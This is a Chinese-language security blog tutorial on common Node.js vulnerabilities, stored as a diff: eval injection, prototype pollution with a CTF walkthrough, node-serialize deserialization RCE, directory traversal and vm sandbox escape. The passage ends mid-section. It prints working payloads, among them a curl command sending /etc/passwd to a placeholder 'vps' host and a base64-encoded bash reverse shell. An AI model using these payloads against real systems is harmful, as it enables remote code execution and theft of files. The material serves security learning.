@@ -1,0 +1,278 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="renderer" content="webkit">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <title>
+        Threezh1&#39;Blog
+    </title>
+    
+<link rel="stylesheet" href="/libs/highlight/styles/monokai-sublime.css">
+
+    
+<link rel="stylesheet" href="/libs/font-awesome/css/font-awesome.min.css">
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+<body id="bodyx">
+    <div class="hd posts">
+    <a href="/index.html"><i class="fa fa-reply replay-btn" aria-hidden="true"></i></a>
+    <div class="post-title">
+        <p>
+            Node.js 常见漏洞学习与总结
+        </p>
+        <hr>
+    </div>
+    <div class="post-content">
+        <!--Table of Contents begin-->
+        
+            <div id="toc" class="toc-article">
+            <strong class="toc-title">目录</strong>
+            <a class="js-toggle-toc" href="javascript:void(0)"></a>
+            <div class="toc-content">
+                <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8D%B1%E9%99%A9%E5%87%BD%E6%95%B0%E6%89%80%E5%AF%BC%E8%87%B4%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-text">危险函数所导致的命令执行</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#eval"><span class="toc-text">eval()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%B1%BB%E4%BC%BC%E5%91%BD%E4%BB%A4"><span class="toc-text">类似命令</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Node-js-%E5%8E%9F%E5%9E%8B%E6%B1%A1%E6%9F%93%E6%BC%8F%E6%B4%9E"><span class="toc-text">Node.js 原型污染漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B3%E4%BA%8E%E5%8E%9F%E5%9E%8B%E9%93%BE"><span class="toc-text">关于原型链</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%8E%9F%E7%90%86"><span class="toc-text">原型链污染原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#merge%E6%93%8D%E4%BD%9C%E5%AF%BC%E8%87%B4%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93"><span class="toc-text">merge操作导致原型链污染</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Code-Breaking-2018-Thejs"><span class="toc-text">Code-Breaking 2018 Thejs</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#node-serialize%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96RCE%E6%BC%8F%E6%B4%9E-CVE-2017-5941"><span class="toc-text">node-serialize反序列化RCE漏洞(CVE-2017-5941)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Node-js-%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-CVE-2017-14849"><span class="toc-text">Node.js 目录穿越漏洞复现(CVE-2017-14849)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#vm%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8"><span class="toc-text">vm沙箱逃逸</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#javascript%E5%A4%A7%E5%B0%8F%E5%86%99%E7%89%B9%E6%80%A7"><span class="toc-text">javascript大小写特性</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AF%B4%E5%9C%A8%E6%9C%80%E5%90%8E"><span class="toc-text">说在最后</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-text">参考</span></a></li></ol>
+            </div>
+            </div>
+        
+        <!--Table of Contents end -->
+        <h2 id="危险函数所导致的命令执行"><a href="#危险函数所导致的命令执行" class="headerlink" title="危险函数所导致的命令执行"></a>危险函数所导致的命令执行</h2><h3 id="eval"><a href="#eval" class="headerlink" title="eval()"></a>eval()</h3><p>eval() 函数可计算某个字符串，并执行其中的的 JavaScript 代码。和PHP中eval函数一样，如果传递到函数中的参数可控并且没有经过严格的过滤时，就会导致漏洞的出现。</p>
+<a id="more"></a>
+<p>简单例子：</p>
+<p>main.js</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&quot;express&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> app = express();</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">&#x27;/eval&#x27;</span>,<span class="function"><span class="keyword">function</span>(<span class="params">req,res</span>)</span>&#123;</span><br><span class="line">    res.send(<span class="built_in">eval</span>(req.query.q));</span><br><span class="line">    <span class="built_in">console</span>.log(req.query.q);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> server = app.listen(<span class="number">8888</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">	<span class="built_in">console</span>.log(<span class="string">&quot;应用实例，访问地址为 http://127.0.0.1:8888/&quot;</span>);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
+
+<p><strong>漏洞利用：</strong></p>
+<p>Node.js中的chile_process.exec调用的是/bash.sh，它是一个bash解释器，可以执行系统命令。在eval函数的参数中可以构造<code>require(&#39;child_process&#39;).exec(&#39;&#39;);</code>来进行调用。</p>
+<p>弹计算器(windows)：</p>
+<pre><code>/eval?q=require(&#39;child_process&#39;).exec(&#39;calc&#39;);</code></pre>
+<p>读取文件(linux)：</p>
+<pre><code>/eval?q=require(&#39;child_process&#39;).exec(&#39;curl -F &quot;x=`cat /etc/passwd`&quot; http://vps&#39;);;</code></pre>
+<p>反弹shell(linux)：</p>
+<pre><code>/eval?q=require(&#39;child_process&#39;).exec(&#39;echo YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMjcuMC4wLjEvMzMzMyAwPiYx|base64 -d|bash&#39;);
+
+YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMjcuMC4wLjEvMzMzMyAwPiYx是bash -i &gt;&amp; /dev/tcp/127.0.0.1/3333 0&gt;&amp;1 BASE64加密后的结果，直接调用会报错。
+
+注意：BASE64加密后的字符中有一个+号需要url编码为%2B(一定情况下)</code></pre>
+<p>如果上下文中没有require(类似于Code-Breaking 2018 Thejs)，则可以使用<code>global.process.mainModule.constructor._load(&#39;child_process&#39;).exec(&#39;calc&#39;)</code>来执行命令</p>
+<p>paypal一个命令执行的例子：</p>
+<p><a target="_blank" rel="noopener" href="https://artsploit.blogspot.com/2016/08/pprce2.html">[demo.paypal.com] Node.js code injection (RCE)</a></p>
+<p>(使用数组绕过过滤，再调用child_process执行命令)</p>
+<h3 id="类似命令"><a href="#类似命令" class="headerlink" title="类似命令"></a>类似命令</h3><p>间隔两秒执行函数：</p>
+<ul>
+<li>setInteval(some_function, 2000)</li>
+</ul>
+<p>两秒后执行函数：</p>
+<ul>
+<li>setTimeout(some_function, 2000);</li>
+</ul>
+<p>some_function处就类似于eval函数的参数</p>
+<p>输出HelloWorld：</p>
+<ul>
+<li>Function(“console.log(‘HelloWolrd’)”)()</li>
+</ul>
+<p>类似于php中的create_function</p>
+<p>以上都可以导致命令执行</p>
+<h2 id="Node-js-原型污染漏洞"><a href="#Node-js-原型污染漏洞" class="headerlink" title="Node.js 原型污染漏洞"></a>Node.js 原型污染漏洞</h2><p>Javascript原型链参考文章：<a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Inheritance_and_the_prototype_chain">继承与原型链</a></p>
+<h3 id="关于原型链"><a href="#关于原型链" class="headerlink" title="关于原型链"></a>关于原型链</h3><p>文章内关于原型和原型链的知识写的非常详细，就不再总结整个过程了，以下为几个比较重要的点：</p>
+<ul>
+<li>在javascript，每一个实例对象都有一个prototype属性，prototype 属性可以向对象添加属性和方法。</li>
+</ul>
+<p>例子：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">object.prototype.name=value</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>在javascript，每一个实例对象都有一个<code>__proto__</code>属性，这个实例属性指向对象的原型对象(即原型)。可以通过以下方式访问得到某一实例对象的原型对象：</li>
+</ul>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">objectname[<span class="string">&quot;__proto__&quot;</span>]</span><br><span class="line">objectname.__proto__</span><br><span class="line">objectname.constructor.prototype</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>不同对象所生成的原型链如下(部分)：</li>
+</ul>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> o = &#123;<span class="attr">a</span>: <span class="number">1</span>&#125;;</span><br><span class="line"><span class="comment">// o对象直接继承了Object.prototype</span></span><br><span class="line"><span class="comment">// 原型链：</span></span><br><span class="line"><span class="comment">// o ---&gt; Object.prototype ---&gt; null</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> a = [<span class="string">&quot;yo&quot;</span>, <span class="string">&quot;whadup&quot;</span>, <span class="string">&quot;?&quot;</span>];</span><br><span class="line"><span class="comment">// 数组都继承于 Array.prototype</span></span><br><span class="line"><span class="comment">// 原型链：</span></span><br><span class="line"><span class="comment">// a ---&gt; Array.prototype ---&gt; Object.prototype ---&gt; null</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 函数都继承于 Function.prototype</span></span><br><span class="line"><span class="comment">// 原型链：</span></span><br><span class="line"><span class="comment">// f ---&gt; Function.prototype ---&gt; Object.prototype ---&gt; null</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="原型链污染原理"><a href="#原型链污染原理" class="headerlink" title="原型链污染原理"></a>原型链污染原理</h3><p>对于语句：<code>object[a][b] = value</code> 如果可以控制a、b、value的值，将a设置为<code>__proto__</code>，我们就可以给object对象的原型设置一个b属性，值为value。这样所有继承object对象原型的实例对象在本身不拥有b属性的情况下，都会拥有b属性，且值为value。</p>
+<p>来看一个简单的例子：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">object1 = &#123;<span class="string">&quot;a&quot;</span>:<span class="number">1</span>, <span class="string">&quot;b&quot;</span>:<span class="number">2</span>&#125;;</span><br><span class="line">object1.__proto__.foo = <span class="string">&quot;Hello World&quot;</span>;</span><br><span class="line"><span class="built_in">console</span>.log(object1.foo);</span><br><span class="line">object2 = &#123;<span class="string">&quot;c&quot;</span>:<span class="number">1</span>, <span class="string">&quot;d&quot;</span>:<span class="number">2</span>&#125;;</span><br><span class="line"><span class="built_in">console</span>.log(object2.foo);</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2020/02/11/kNacVQXFslGYrWt.png" alt="proto_example.png"></p>
+<p>最终会输出两个Hello World。为什么object2在没有设置foo属性的情况下，也会输出Hello World呢？就是因为在第二条语句中，我们对object1的原型对象设置了一个foo属性，而object2和object1一样，都是继承了Object.prototype。在获取object2.foo时，由于object2本身不存在foo属性，就会往父类Object.prototype中去寻找。这就造成了一个原型链污染，所以原型链污染简单来说就是如果能够控制并修改一个对象的原型，就可以影响到所有和这个对象同一个原型的对象。</p>
+<h3 id="merge操作导致原型链污染"><a href="#merge操作导致原型链污染" class="headerlink" title="merge操作导致原型链污染"></a>merge操作导致原型链污染</h3><p>merge操作是最常见可能控制键名的操作，也最能被原型链攻击。</p>
+<ul>
+<li>简单例子：</li>
+</ul>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">merge</span>(<span class="params">target, source</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> source) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key <span class="keyword">in</span> source &amp;&amp; key <span class="keyword">in</span> target) &#123;</span><br><span class="line">            merge(target[key], source[key])</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            target[key] = source[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> object1 = &#123;&#125;</span><br><span class="line"><span class="keyword">let</span> object2 = <span class="built_in">JSON</span>.parse(<span class="string">&#x27;&#123;&quot;a&quot;: 1, &quot;__proto__&quot;: &#123;&quot;b&quot;: 2&#125;&#125;&#x27;</span>)</span><br><span class="line">merge(object1, object2)</span><br><span class="line"><span class="built_in">console</span>.log(object1.a, object1.b)</span><br><span class="line"></span><br><span class="line">object3 = &#123;&#125;</span><br><span class="line"><span class="built_in">console</span>.log(object3.b)</span><br></pre></td></tr></table></figure>
+
+<p>需要注意的点是：</p>
+<p>在JSON解析的情况下，<code>__proto__</code>会被认为是一个真正的“键名”，而不代表“原型”，所以在遍历object2的时候会存在这个键。</p>
+<p>最终输出的结果为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1 2</span><br><span class="line">2</span><br></pre></td></tr></table></figure>
+
+<p>可见object3的b是从原型中获取到的，说明Object已经被污染了。</p>
+<h3 id="Code-Breaking-2018-Thejs"><a href="#Code-Breaking-2018-Thejs" class="headerlink" title="Code-Breaking 2018 Thejs"></a>Code-Breaking 2018 Thejs</h3><p>这个题目已经有很多的分析文章了，但因为它是一个比较好的学习原型链污染的题目，还是值得自己再过一遍。</p>
+<p>题目源码下载：<a target="_blank" rel="noopener" href="http://code-breaking.com/puzzle/9/">http://code-breaking.com/puzzle/9/</a></p>
+<p>直接npm install可以把需要的模块下载下来。</p>
+<p>server.js</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> lodash = <span class="built_in">require</span>(<span class="string">&#x27;lodash&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> session = <span class="built_in">require</span>(<span class="string">&#x27;express-session&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> randomize = <span class="built_in">require</span>(<span class="string">&#x27;randomatic&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = express()</span><br><span class="line">app.use(bodyParser.urlencoded(&#123;<span class="attr">extended</span>: <span class="literal">true</span>&#125;)).use(bodyParser.json())</span><br><span class="line">app.use(<span class="string">&#x27;/static&#x27;</span>, express.static(<span class="string">&#x27;static&#x27;</span>))</span><br><span class="line">app.use(session(&#123;</span><br><span class="line">    name: <span class="string">&#x27;thejs.session&#x27;</span>,</span><br><span class="line">    secret: randomize(<span class="string">&#x27;aA0&#x27;</span>, <span class="number">16</span>),</span><br><span class="line">    resave: <span class="literal">false</span>,</span><br><span class="line">    saveUninitialized: <span class="literal">false</span></span><br><span class="line">&#125;))</span><br><span class="line"></span><br><span class="line">app.engine(<span class="string">&#x27;ejs&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">filePath, options, callback</span>) </span>&#123; <span class="comment">// define the template engine</span></span><br><span class="line">    fs.readFile(filePath, <span class="function">(<span class="params">err, content</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (err) <span class="keyword">return</span> callback(<span class="keyword">new</span> <span class="built_in">Error</span>(err))</span><br><span class="line">        <span class="keyword">let</span> compiled = lodash.template(content)</span><br><span class="line">        <span class="keyword">let</span> rendered = compiled(&#123;...options&#125;)</span><br><span class="line">        <span class="keyword">return</span> callback(<span class="literal">null</span>, rendered)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br><span class="line">app.set(<span class="string">&#x27;views&#x27;</span>, <span class="string">&#x27;./views&#x27;</span>)</span><br><span class="line">app.set(<span class="string">&#x27;view engine&#x27;</span>, <span class="string">&#x27;ejs&#x27;</span>)</span><br><span class="line"></span><br><span class="line">app.all(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// 定义session</span></span><br><span class="line">    <span class="keyword">let</span> data = req.session.data || &#123;<span class="attr">language</span>: [], <span class="attr">category</span>: []&#125;</span><br><span class="line">    <span class="keyword">if</span> (req.method == <span class="string">&#x27;POST&#x27;</span>) &#123;</span><br><span class="line">        <span class="comment">// 获取post数据并合并</span></span><br><span class="line">        data = lodash.merge(data, req.body)</span><br><span class="line">        req.session.data = data</span><br><span class="line">        <span class="comment">// 再将data赋值给session</span></span><br><span class="line">    &#125;</span><br><span class="line">    res.render(<span class="string">&#x27;index&#x27;</span>, &#123;</span><br><span class="line">        language: data.language, </span><br><span class="line">        category: data.category</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.listen(<span class="number">3000</span>, <span class="function">() =&gt;</span> <span class="built_in">console</span>.log(<span class="string">&#x27;Example app listening on port 3000!&#x27;</span>))</span><br></pre></td></tr></table></figure>
+
+<p>问题出在了lodashs.merge函数这里，这个函数存在原型链污染漏洞。但是光存在漏洞还不行，我们得寻找到可以利用的点。因为通过漏洞可以控制某一种实例对象原型的属性，所以我们需要去寻找一个可以被利用的属性。</p>
+<p>页面最终会通过lodash.template进行渲染，跟踪到lodash/template.js中。</p>
+<p><img src="https://i.loli.net/2020/02/11/QyN5JVOde3YL8aZ.png" alt="template_js.png"></p>
+<p>如图可以看到options是一个对象，sourceURL是通过下面的语句赋值的，options默认没有sourceURL属性，所以sourceURL默认也是为空。</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> sourceURL = <span class="string">&#x27;sourceURL&#x27;</span> <span class="keyword">in</span> options ? <span class="string">&#x27;//# sourceURL=&#x27;</span> + options.sourceURL + <span class="string">&#x27;\n&#x27;</span> : <span class="string">&#x27;&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>如果我们能够给options的原型对象加一个sourceURL属性，那么我们就可以控制sourceURL的值。</p>
+<p>继续往下面看，最后sourceURL传递到了Function函数的第二个参数当中：</p>
+<p><img src="https://i.loli.net/2020/02/11/pwoVFrOyfzJX42M.png" alt="template_js01.png"></p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> result = attempt(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">Function</span>(importsKeys, sourceURL + <span class="string">&#x27;return &#x27;</span> + source)</span><br><span class="line">    .apply(<span class="literal">undefined</span>, importsValues);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<p>通过构造chile_process.exec()就可以执行任意代码了。</p>
+<p>最终可以构造一个简单的Payload作为传递给主页面的的POST数据(windows调用计算器)：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;sourceURL&quot;</span>:<span class="string">&quot;\nglobal.process.mainModule.constructor._load(&#x27;child_process&#x27;).exec(&#x27;calc&#x27;)//&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>(这里直接用require会报错：ReferenceError: require is not defined</p>
+<p>p神给了一个更好的payload：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;sourceURL&quot;</span>:<span class="string">&quot;\nreturn e=&gt; &#123;for (var a in &#123;&#125;) &#123;delete Object.prototype[a];&#125; return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;id&#x27;)&#125;\n//&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="node-serialize反序列化RCE漏洞-CVE-2017-5941"><a href="#node-serialize反序列化RCE漏洞-CVE-2017-5941" class="headerlink" title="node-serialize反序列化RCE漏洞(CVE-2017-5941)"></a>node-serialize反序列化RCE漏洞(CVE-2017-5941)</h2><p>漏洞出现在node-serialize模块0.0.4版本当中，使用<code>npm install node-serialize@0.0.4</code>安装模块。</p>
+<ul>
+<li>了解什么是IIFE：</li>
+</ul>
+<p><a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Glossary/%E7%AB%8B%E5%8D%B3%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0%E8%A1%A8%E8%BE%BE%E5%BC%8F">IIFE（立即调用函数表达式）</a>是一个在定义时就会立即执行的  JavaScript 函数。</p>
+<p>IIFE一般写成下面的形式：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123; <span class="comment">/* code */</span> &#125;());</span><br><span class="line"><span class="comment">// 或者</span></span><br><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123; <span class="comment">/* code */</span> &#125;)();</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>node-serialize@0.0.4</code>漏洞点</li>
+</ul>
+<p>漏洞代码位于node_modules\node-serialize\lib\serialize.js中：</p>
+<p><img src="https://i.loli.net/2020/02/11/aDr6o823Ux4F5Zw.png" alt="serialize_eval.png"></p>
+<p>其中的关键就是：<code>obj[key] = eval(&#39;(&#39; + obj[key].substring(FUNCFLAG.length) + &#39;)&#39;);</code>这一行语句，可以看到传递给eval的参数是用括号包裹的，所以如果构造一个<code>function()&#123;&#125;()</code>函数，在反序列化时就会被当中IIFE立即调用执行。来看如何构造payload：</p>
+<ul>
+<li>构造Payload</li>
+</ul>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">serialize = <span class="built_in">require</span>(<span class="string">&#x27;node-serialize&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> test = &#123;</span><br><span class="line"> rce : <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).exec(<span class="string">&#x27;ls /&#x27;</span>,<span class="function"><span class="keyword">function</span>(<span class="params">error, stdout, stderr</span>)</span>&#123;<span class="built_in">console</span>.log(stdout)&#125;);&#125;,</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;序列化生成的 Payload: \n&quot;</span> + serialize.serialize(test));</span><br></pre></td></tr></table></figure>
+
+<p>生成的Payload为：</p>
+<p><code>&#123;&quot;rce&quot;:&quot;_$$ND_FUNC$$_function()&#123;require(&#39;child_process&#39;).exec(&#39;ls /&#39;,function(error, stdout, stderr)&#123;console.log(stdout)&#125;);&#125;&quot;&#125;</code></p>
+<p>因为需要在反序列化时让其立即调用我们构造的函数，所以我们需要在生成的序列化语句的函数后面再添加一个<code>()</code>，结果如下：</p>
+<p><code>&#123;&quot;rce&quot;:&quot;_$$ND_FUNC$$_function()&#123;require(&#39;child_process&#39;).exec(&#39;ls /&#39;,function(error, stdout, stderr)&#123;console.log(stdout)&#125;);&#125;()&quot;&#125;</code></p>
+<p>(这里不能直接在对象内定义IIFE表达式，不然会序列化失败)</p>
+<p>传递给unserialize(注意转义单引号)：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> serialize = <span class="built_in">require</span>(<span class="string">&#x27;node-serialize&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> payload = <span class="string">&#x27;&#123;&quot;rce&quot;:&quot;_$$ND_FUNC$$_function()&#123;require(\&#x27;child_process\&#x27;).exec(\&#x27;ls /\&#x27;,function(error, stdout, stderr)&#123;console.log(stdout)&#125;);&#125;()&quot;&#125;&#x27;</span>;</span><br><span class="line">serialize.unserialize(payload);</span><br></pre></td></tr></table></figure>
+
+<p>执行命令成功，结果如图：</p>
+<p><img src="https://i.loli.net/2020/02/11/V1hOMYz7fQ3KB6X.png" alt="serialize_result.png"></p>
+<h2 id="Node-js-目录穿越漏洞复现-CVE-2017-14849"><a href="#Node-js-目录穿越漏洞复现-CVE-2017-14849" class="headerlink" title="Node.js 目录穿越漏洞复现(CVE-2017-14849)"></a>Node.js 目录穿越漏洞复现(CVE-2017-14849)</h2><p>在vulhub上面可以直接下载到环境。</p>
+<p>漏洞影响的版本：</p>
+<ul>
+<li>Node.js 8.5.0 + Express 3.19.0-3.21.2</li>
+<li>Node.js 8.5.0 + Express 4.11.0-4.15.5</li>
+</ul>
+<p>运行漏洞环境：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd vulhub&#x2F;node&#x2F;CVE-2017-14849&#x2F;</span><br><span class="line">docker-compose build</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
+
+<p>用Burpsuite获取地址：<code>/static/../../../a/../../../../etc/passwd</code> 即可下载得到<code>/etc/passwd</code>文件</p>
+<p><img src="https://i.loli.net/2020/02/11/L8pV6gXoAnJSRQ4.png" alt="node_dir.png"></p>
+<p>具体分析可见：<a target="_blank" rel="noopener" href="https://security.tencent.com/index.php/blog/msg/121">Node.js CVE-2017-14849 漏洞分析</a></p>
+<h2 id="vm沙箱逃逸"><a href="#vm沙箱逃逸" class="headerlink" title="vm沙箱逃逸"></a>vm沙箱逃逸</h2><p>vm是用来实现一个沙箱环境，可以安全的执行不受信任的代码而不会影响到主程序。但是可以通过构造语句来进行逃逸：</p>
+<p>逃逸例子：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&quot;vm&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> env = vm.runInNewContext(<span class="string">`this.constructor.constructor(&#x27;return this.process.env&#x27;)()`</span>);</span><br><span class="line"><span class="built_in">console</span>.log(env);</span><br></pre></td></tr></table></figure>
+
+<p>执行之后可以获取到主程序环境中的环境变量</p>
+<p>上面例子的代码等价于如下代码：</p>
